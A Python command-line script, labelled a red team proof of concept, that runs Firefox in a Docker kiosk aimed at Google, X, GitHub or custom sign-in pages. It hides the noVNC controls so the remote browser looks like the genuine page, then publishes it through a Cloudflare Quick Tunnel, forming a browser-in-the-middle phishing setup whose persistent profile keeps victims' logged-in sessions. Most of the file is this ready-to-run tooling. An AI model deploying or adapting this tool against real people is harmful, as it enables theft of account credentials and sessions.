#!/usr/bin/env python3
"""
Firefox Docker Setup Manager — red team POC (CLI only).

Subcommands:
  core       Core Firefox browser (full desktop)
  mobile     Mobile kiosk (configurable size, autoconnect+scale URL)
  desktop    Desktop kiosk (plain URL, native framebuffer)
  stop       Stop + remove firefox-setup and firefox-kiosk (-y required)
  reset      Stop + remove + wipe Firefox profile (-y required)
  sites      List preset site names and exit
  sizes      List mobile preset sizes and exit

Cloudflare tunnel:
  Pass -tun / --tunnel to core/desktop/mobile to expose the noVNC port
  publicly via a Cloudflare Quick Tunnel (https://<random>.trycloudflare.com).
  Requires `cloudflared` in PATH (e.g. `brew install cloudflared`).

Shorthand:
  The subcommand may be omitted. The tool infers one from the flags:
    -l/-u present, no -s        -> desktop
    -l/-u present with -s       -> mobile
    -s present, no target       -> mobile
    nothing target/size-related -> core

Examples:
  ./app.py core
  ./app.py core -tun
  ./app.py desktop -l google
  ./app.py desktop -l google -tun
  ./app.py mobile  -l x -tun
  ./app.py mobile  -l x --size iphone-14-pro-max
  ./app.py mobile  -u https://example.com/login -s 390x844
  ./app.py -l google -tun                # shorthand -> desktop -l google -tun
  ./app.py -tun -l google                # same thing
  ./app.py -u https://x.com -s iphone-12 -tun   # shorthand -> mobile ...
  ./app.py -tun                          # shorthand -> core -tun
  ./app.py stop -y
  ./app.py reset -y
"""
import argparse
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time

from rich.console import Console
from rich.panel import Panel

console = Console()

FIREFOX_DATA_DIR = "/docker/appdata/firefox"
DEFAULT_PORT = 80

PRESET_SITES = {
    "google": ("Google Sign-In", "https://accounts.google.com"),
    "x": ("X (Twitter) Sign-In", "https://x.com/i/flow/login"),
    "github": ("GitHub Sign-In", "https://github.com/login"),
}

MOBILE_SIZES = {
    "default": (500, 710),
    "iphone-se": (375, 667),
    "iphone-12": (390, 844),
    "iphone-14-pro-max": (430, 932),
    "pixel-7": (412, 915),
    "galaxy-s21": (360, 800),
    "tablet": (768, 1024),
}

USE_SUDO = False
_CLOUDFLARED_PROC = None

CLOUDFLARED_RE = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")

KNOWN_SUBCMDS = {"core", "mobile", "desktop", "stop", "reset", "sites", "sizes"}
TARGET_FLAGS = {"-l", "--list", "-u", "--url"}
SIZE_FLAGS = {"-s", "--size"}



def wait_for_exit():
  """Keep the script alive so the tunnel and container don't die."""
  if _CLOUDFLARED_PROC is None:
    return
  console.print(
      "\n[dim]Press Ctrl+C to stop the Cloudflare tunnel and exit.[/dim]"
  )
  try:
    while True:
      time.sleep(1)
  except KeyboardInterrupt:
    console.print("\n[yellow]Shutting down...[/yellow]")
    stop_and_remove_all()
    sys.exit(0)

def _docker_works():
  try:
    subprocess.run(
        ["docker", "info"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True,
    )
    return True
  except (subprocess.CalledProcessError, FileNotFoundError):
    return False


def _sudo_docker_works():
  try:
    subprocess.run(
        ["sudo", "-n", "docker", "info"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True,
    )
    return True
  except (subprocess.CalledProcessError, FileNotFoundError):
    return False


def detect_sudo():
  global USE_SUDO
  if os.geteuid() == 0:
    USE_SUDO = False
    return _docker_works()
  if _docker_works():
    USE_SUDO = False
    return True
  if _sudo_docker_works():
    USE_SUDO = True
    return True
  if not shutil.which("sudo"):
    console.print(
        "[bold red]Docker requires root but sudo is not installed.[/bold red]"
    )
    return False
  console.print(
      "[yellow]Docker requires sudo. Requesting credentials...[/yellow]"
  )
  try:
    subprocess.run(["sudo", "-v"], check=True)
  except subprocess.CalledProcessError:
    console.print("[bold red]Sudo authentication failed.[/bold red]")
    return False
  if _sudo_docker_works():
    USE_SUDO = True
    return True
  console.print(
      "[bold red]Docker daemon not reachable even with sudo.[/bold red]"
  )
  return False


def docker(*args, capture=False, check=False):
  cmd = (["sudo"] if USE_SUDO else []) + ["docker", *args]
  try:
    return subprocess.run(
        cmd,
        stdout=subprocess.PIPE if capture else subprocess.DEVNULL,
        stderr=subprocess.PIPE if capture else subprocess.DEVNULL,
        text=True,
        check=check,
    )
  except subprocess.CalledProcessError:
    if check:
      raise
    return None


def run_detached(name, port, env, data_dir, shm):
  args = [
      "run", "-d",
      "--name", name,
      "-p", f"{port}:5800",
      "-v", f"{data_dir}:/config:z",
      "--shm-size", shm,
  ]
  for k, v in env.items():
    args += ["-e", f"{k}={v}"]
  args.append("jlesage/firefox")

  r = docker(*args, capture=True)
  if r is None or r.returncode != 0:
    if r is not None and r.stderr:
      console.print(f"[red]{r.stderr.strip()}[/red]")
    return False
  return True



def cloudflared_path():
  """Locate cloudflared. Falls back to common brew/usr paths if PATH is stripped."""
  p = shutil.which("cloudflared")
  if p:
    return p
  for c in (
      "/home/linuxbrew/.linuxbrew/bin/cloudflared",
      "/var/home/linuxbrew/.linuxbrew/bin/cloudflared",
      "/usr/local/bin/cloudflared",
      "/usr/bin/cloudflared",
  ):
    if os.path.isfile(c) and os.access(c, os.X_OK):
      return c
  return None


def start_cloudflare_tunnel(local_port, capture_timeout=20):
  """
  Start a Cloudflare Quick Tunnel against http://localhost:<port>.
  Returns (proc, public_url) or (None, None) on failure.
  """
  cf = cloudflared_path()
  if not cf:
    console.print(
        "[bold red]cloudflared not found.[/bold red] "
        "Install it with: brew install cloudflared"
    )
    return None, None

  target = f"http://localhost:{local_port}"
  cmd = [cf, "tunnel", "--url", target, "--no-autoupdate"]

  console.print(
      f"[yellow]--> Starting Cloudflare Quick Tunnel -> {target}..."
      "[/yellow]"
  )

  proc = subprocess.Popen(
      cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE,
      text=True,
      bufsize=1,
  )

  found = {}

  def _drain():
    try:
      for line in proc.stderr:
        if "url" not in found:
          m = CLOUDFLARED_RE.search(line)
          if m:
            found["url"] = m.group(0)
    except Exception:
      pass

  threading.Thread(target=_drain, daemon=True).start()

  deadline = time.time() + capture_timeout
  while time.time() < deadline and "url" not in found and proc.poll() is None:
    time.sleep(0.2)

  if "url" not in found:
    console.print(
        "[bold red]Could not parse trycloudflare.com URL from"
        " cloudflared output.[/bold red]"
    )
    try:
      proc.terminate()
    except Exception:
      pass
    return None, None

  public_url = found["url"]
  console.print(Panel(
      f"[bold green]Cloudflare tunnel active![/bold green]\n"
      f"Public URL: [cyan]{public_url}[/cyan]\n\n"
      f"[dim]Ephemeral -- dies when cloudflared stops.[/dim]",
      border_style="blue",
  ))
  return proc, public_url


def stop_cloudflare_tunnel(proc):
  if proc is None or proc.poll() is not None:
    return
  try:
    proc.terminate()
    proc.wait(timeout=5)
  except subprocess.TimeoutExpired:
    try:
      proc.kill()
    except Exception:
      pass
  except Exception:
    pass
  console.print("[dim]Cloudflare tunnel stopped.[/dim]")


def _maybe_start_tunnel(args):
  """Start the tunnel if -tun/--tunnel was passed; stash the proc for cleanup."""
  global _CLOUDFLARED_PROC
  if not getattr(args, "tunnel", False):
    return None
  proc, _url = start_cloudflare_tunnel(args.port)
  if proc:
    _CLOUDFLARED_PROC = proc
  return proc



def _argv_has_flag(argv, flags):
  """Return True if any token in argv matches one of the given option strings."""
  shorts = {f for f in flags if len(f) == 2 and not f.startswith("--")}
  for tok in argv:
    if tok in flags:
      return True
    if "=" in tok and tok.split("=", 1)[0] in flags:
      return True
    for f in shorts:
      if (tok.startswith(f) and len(tok) > 2
          and not tok.startswith("--")):
        return True
  return False


def normalize_argv(argv):
  """
  Allow shorthand invocations without an explicit subcommand.

  Examples:
    ["-l", "google", "-tun"]         -> ["desktop", "-l", "google", "-tun"]
    ["-u", "...", "-s", "iphone-12"] -> ["mobile", "-u", "...", "-s", "iphone-12"]
    ["-tun"]                         -> ["core", "-tun"]
  """
  if not argv:
    return argv
  first = argv[0]
  if first in KNOWN_SUBCMDS:
    return argv
  if first in ("-h", "--help", "help"):
    return argv

  has_target = _argv_has_flag(argv, TARGET_FLAGS)
  has_size = _argv_has_flag(argv, SIZE_FLAGS)

  if has_target and has_size:
    inferred = "mobile"
  elif has_target:
    inferred = "desktop"
  elif has_size:
    inferred = "mobile"
  else:
    inferred = "core"

  normalized = [inferred] + argv
  console.print(
      "[dim]inferred subcommand:[/dim] "
      f"[cyan]{inferred}[/cyan] "
      f"[dim](executing as: app.py {' '.join(normalized)})[/dim]"
  )
  return normalized



def show_sites():
  for key, (name, url) in PRESET_SITES.items():
    console.print(f"  [cyan]{key:<18}[/cyan] {name} ([dim]{url}[/dim])")


def show_sizes():
  for key, (w, h) in MOBILE_SIZES.items():
    console.print(f"  [cyan]{key:<18}[/cyan] {w}x{h}")


def hide_novnc_ui():
  cmd = [
      "sudo",
      "docker",
      "exec",
      "firefox-kiosk",
      "sed",
      "-i",
      r"s/<\/head>/<style>html, body, #noVNC_container { margin: 0 !important; padding: 0 !important; overflow: hidden !important; background-color: #202124 !important; } #noVNC_control_bar, #noVNC_control_bar_handle, .noVNC_panel, #noVNC_status, #noVNC_transition { display: none !important; }<\/style><\/head>/",
      "/opt/noVNC/index.html",
  ]
  try:
    subprocess.run(cmd, check=True)
    return True
  except subprocess.CalledProcessError:
    return False


def stop_and_remove_all():
  global _CLOUDFLARED_PROC
  stop_cloudflare_tunnel(_CLOUDFLARED_PROC)
  _CLOUDFLARED_PROC = None
  docker("stop", "firefox-setup", "firefox-kiosk")
  docker("rm", "firefox-setup", "firefox-kiosk")


def _cleanup_on_exit(signum=None, frame=None):
  stop_and_remove_all()
  sys.exit(0)


def install_stop_handler():
  signal.signal(signal.SIGINT, _cleanup_on_exit)
  signal.signal(signal.SIGTERM, _cleanup_on_exit)
  console.print(
      "[dim]Stop-on-exit enabled (SIGINT/SIGTERM will stop"
      " containers + tunnel).[/dim]"
  )


def reset_firefox_profile():
  console.print(
      f"[yellow]--> Resetting Firefox profile in {FIREFOX_DATA_DIR}..."
      "[/yellow]"
  )
  r = docker(
      "run", "--rm",
      "-v", f"{FIREFOX_DATA_DIR}:/data",
      "alpine", "sh", "-c",
      "rm -rf /data/* /data/.[!.]* /data/..?* 2>/dev/null; true",
      capture=True,
  )
  if r is None or r.returncode != 0:
    try:
      subprocess.run(
          ["sudo", "sh", "-c",
           f"rm -rf {FIREFOX_DATA_DIR}/* {FIREFOX_DATA_DIR}/.[!.]*"],
          check=False,
      )
    except Exception:
      pass
  console.print("[green]Profile reset.[/green]")


def resolve_target(args):
  """Resolve --url / --list into a single URL. argparse enforces one of them."""
  if args.list:
    return PRESET_SITES[args.list][1]
  return args.url


def _access_url(mode, port):
  """Operator-facing URL for the deployed kiosk."""
  suffix = "" if port == 80 else f":{port}"
  base = f"http://127.0.0.1{suffix}/"
  if mode == "mobile":
    return base + "?autoconnect=true&resize=scale"
  return base



def deploy_core(args):
  console.print(
      "[yellow]--> Stopping and removing existing conflicting"
      " containers...[/yellow]"
  )
  stop_and_remove_all()

  console.print("[yellow]--> Running Core Firefox Browser...[/yellow]")
  if run_detached("firefox-setup", args.port, {}, args.data, "4g"):
    console.print(Panel(
        f"Core Firefox deployed successfully at"
        f" {_access_url('core', args.port)}",
        border_style="green",
    ))
    _maybe_start_tunnel(args)
  else:
    console.print(
        "[bold red]Error: Failed to deploy Core Firefox container.[/bold red]"
    )
    sys.exit(1)


def _deploy_kiosk(args, mode):
  target_url = resolve_target(args)
  label = {"mobile": "Mobile Kiosk", "desktop": "Desktop Kiosk"}[mode]

  console.print(
      "[yellow]--> Stopping and removing existing conflicting"
      " containers...[/yellow]"
  )
  stop_and_remove_all()

  console.print(f"[yellow]--> Running {label}...[/yellow]")
  if mode == "mobile":
    width, height = args.size
    console.print(f"[dim]    Size: {width}x{height}[/dim]")
    env = {
        "DISPLAY_WIDTH": str(width),
        "DISPLAY_HEIGHT": str(height),
        "FF_OPEN_URL": target_url,
        "FF_KIOSK": "1",
    }
  else:
    env = {"FF_OPEN_URL": target_url, "FF_KIOSK": "1"}

  if not run_detached("firefox-kiosk", args.port, env, args.data, "2g"):
    console.print(f"[bold red]Error: Failed to deploy {label}.[/bold red]")
    sys.exit(1)

  console.print("[yellow]--> Waiting for container initialization...[/yellow]")
  time.sleep(2)
  console.print("[yellow]--> Applying noVNC UI cleanup styles...[/yellow]")
  if not hide_novnc_ui():
    console.print(
        "[yellow]Warning: noVNC UI cleanup failed (non-fatal)."
        " Control bar may be visible.[/yellow]"
    )

  size_line = f"\nSize: {args.size[0]}x{args.size[1]}" if mode == "mobile" else ""
  console.print()
  console.print(Panel(
      f"{label} deployed successfully!\nAccess it here:\n"
      f"{_access_url(mode, args.port)}{size_line}",
      border_style="green",
  ))
  _maybe_start_tunnel(args)
  console.print()


def do_stop(args):
  if not args.yes:
    console.print(
        "[red]Refusing to stop without -y/--yes"
        " (destructive operation).[/red]"
    )
    sys.exit(1)
  console.print(
      "[yellow]--> Stopping and removing Firefox containers + tunnel..."
      "[/yellow]"
  )
  stop_and_remove_all()
  console.print(Panel(
      "All Firefox containers stopped and removed successfully.",
      border_style="green",
  ))


def do_reset(args):
  if not args.yes:
    console.print(
        "[red]Refusing to reset without -y/--yes (destructive operation)."
        "[/red]"
    )
    sys.exit(1)
  stop_and_remove_all()
  reset_firefox_profile()



def parse_size(value):
  """Parse 'NAME' or 'WxH' into (width, height) tuple."""
  key = value.strip().lower()
  if key in MOBILE_SIZES:
    return MOBILE_SIZES[key]
  m = re.match(r"^(\d+)\s*[xX]\s*(\d+)$", key)
  if m:
    w, h = int(m.group(1)), int(m.group(2))
    if w <= 0 or h <= 0:
      raise argparse.ArgumentTypeError(
          f"Width and height must be positive (got {w}x{h})."
      )
    return (w, h)
  raise argparse.ArgumentTypeError(
      f"Unknown size '{value}'. Use a preset "
      f"({', '.join(MOBILE_SIZES)}) or custom WxH (e.g. 390x844)."
  )


def _add_common(p):
  p.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                 help=f"Host port mapped to noVNC (default {DEFAULT_PORT})")
  p.add_argument("-d", "--data", default=FIREFOX_DATA_DIR,
                 help="Firefox profile directory")
  p.add_argument("--stop-on-exit", action="store_true",
                 help="Stop containers on SIGINT/SIGTERM")
  p.add_argument("-tun", "--tunnel", action="store_true",
                 help="Start a Cloudflare Quick Tunnel for public access"
                      " (requires cloudflared in PATH)")
  p.add_argument("--script", metavar="FILE",
                 help="Path to a Tampermonkey userscript to inject")


def _add_target(p):
  g = p.add_mutually_exclusive_group(required=True)
  g.add_argument("-u", "--url",
                 help="Custom target URL (e.g. https://example.com/login)")
  g.add_argument("-l", "--list", dest="list", metavar="NAME",
                 choices=sorted(PRESET_SITES),
                 help=f"Preset site name ({', '.join(sorted(PRESET_SITES))})")


def build_parser():
  p = argparse.ArgumentParser(
      prog="app.py",
      description="Firefox Docker Setup Manager — red team POC harness"
                  " (CLI only). Subcommand may be omitted; see examples.",
      formatter_class=argparse.RawDescriptionHelpFormatter,
      epilog="""examples:
  app.py core
  app.py core -tun
  app.py desktop -l google
  app.py desktop -l google -tun
  app.py mobile -l x -tun
  app.py mobile -l x --size iphone-14-pro-max
  app.py mobile -u https://example.com/login -s 390x844
  app.py -l google -tun                 # shorthand -> desktop -l google -tun
  app.py -tun -l google                 # same
  app.py -u https://x.com -s iphone-12 -tun   # shorthand -> mobile ...
  app.py -tun                           # shorthand -> core -tun
  app.py stop -y
  app.py reset -y
  app.py sites
  app.py sizes
""",
  )
  sub = p.add_subparsers(dest="command", metavar="<command>")
  sub.required = True

  pc = sub.add_parser("core", help="Deploy core Firefox browser")
  _add_common(pc)

  sp = sub.add_parser("desktop", help="Deploy desktop kiosk")
  _add_common(sp)
  _add_target(sp)

  sp = sub.add_parser(
      "mobile", help="Deploy mobile kiosk (configurable size)"
  )
  _add_common(sp)
  _add_target(sp)
  sp.add_argument(
      "-s", "--size", type=parse_size, default=MOBILE_SIZES["default"],
      metavar="NAME|WxH",
      help=f"Mobile viewport size. Preset name ({', '.join(MOBILE_SIZES)}) "
           f"or custom WxH (e.g. 390x844). Default: "
           f"{MOBILE_SIZES['default'][0]}x{MOBILE_SIZES['default'][1]}.",
  )

  for name, desc in (
      ("stop", "Stop and remove Firefox containers (-y required)"),
      ("reset", "Stop + remove + wipe Firefox profile (-y required)"),
  ):
    sp = sub.add_parser(name, help=desc)
    _add_common(sp)
    sp.add_argument("-y", "--yes", action="store_true",
                    help="Confirm destructive operation")

  sub.add_parser("sites", help="List preset site names and exit")
  sub.add_parser("sizes", help="List mobile preset sizes and exit")

  return p


def main():
  parser = build_parser()
  argv = normalize_argv(sys.argv[1:])
  args = parser.parse_args(argv)
  command = args.command

  if command == "sites":
    show_sites()
    return
  if command == "sizes":
    show_sizes()
    return

  if not detect_sudo():
    sys.exit(1)

  mode = "sudo" if USE_SUDO else "user"
  console.print(f"[dim]Docker commands will run as: {mode}[/dim]")

  if not hasattr(args, "port"):
    args.port = DEFAULT_PORT
  if not hasattr(args, "data"):
    args.data = FIREFOX_DATA_DIR
  if not hasattr(args, "yes"):
    args.yes = False

  if getattr(args, "stop_on_exit", False):
    install_stop_handler()

  if command == "core":
    deploy_core(args)
    wait_for_exit() 
  elif command in ("mobile", "desktop"):
    _deploy_kiosk(args, command)
    wait_for_exit() 
  elif command == "stop":
    do_stop(args)
    wait_for_exit() 
  elif command == "reset":
    do_reset(args)
    wait_for_exit() 
  else:
    parser.print_help()
    sys.exit(1)


if __name__ == "__main__":
  main()